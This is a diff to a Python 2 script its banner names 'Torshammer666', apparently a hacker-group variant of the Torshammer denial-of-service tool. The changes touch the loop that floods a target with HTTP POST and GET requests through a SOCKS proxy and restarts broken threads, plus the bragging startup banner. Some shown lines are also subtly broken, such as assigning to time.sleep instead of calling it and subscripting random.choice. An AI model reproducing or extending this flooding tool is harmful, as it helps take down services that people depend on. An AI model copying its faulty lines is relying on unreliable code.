@@ -216,16 +216,16 @@ class httpPost(Thread):
                     time.sleep = (random.uniform(1, 3))
                     continue
 
-        while self.running:
-            try:
-                random.choice[(self._send_http_post(), self._send_http_get())]
-            except Exception, e:
-                if e.args[0] == 32 or e.args[0] == 104:
-                    print term.BOL + term.UP + term.CLEAR_EOL + "Broken threads, restarting..." + term.NORMAL
-                    self.socks = socks.socksocket()
-                    break
-                time.sleep(0.1)
-                pass
+            while self.running:
+                try:
+                    random.choice[(self._send_http_post(), self._send_http_get())]
+                except Exception, e:
+                    if e.args[0] == 32 or e.args[0] == 104:
+                        print term.BOL + term.UP + term.CLEAR_EOL + "Broken threads, restarting..." + term.NORMAL
+                        self.socks = socks.socksocket()
+                        break
+                    time.sleep(0.1)
+                    pass
 
 
 def usage():
@@ -293,12 +293,12 @@ def main(argv):
 
 if __name__ == "__main__":
     print "\n/*"
-    time.sleep(01)
+    # time.sleep(01)
     print " *"   "~an0nsec666~ \n"
     print " *" "-=============================================-\n"
     print " *" "   Torshammer666v666 ;) bitches! "
     print " *""   An0nsec Hackers\n"
-    time.sleep(02)
+    # time.sleep(02)
     print " *"" -=============================================-"
     print " *" + term.GREEN + "~An0nsec666: An0nsecHackers " + term.NORMAL
     print " * Torshammer with added GET / Request method & tweaked randomizers "
@@ -311,3 +311,5 @@ if __name__ == "__main__":
     print " */\n"
 
     main(sys.argv[1:])
+
+    print "Bye...\n"
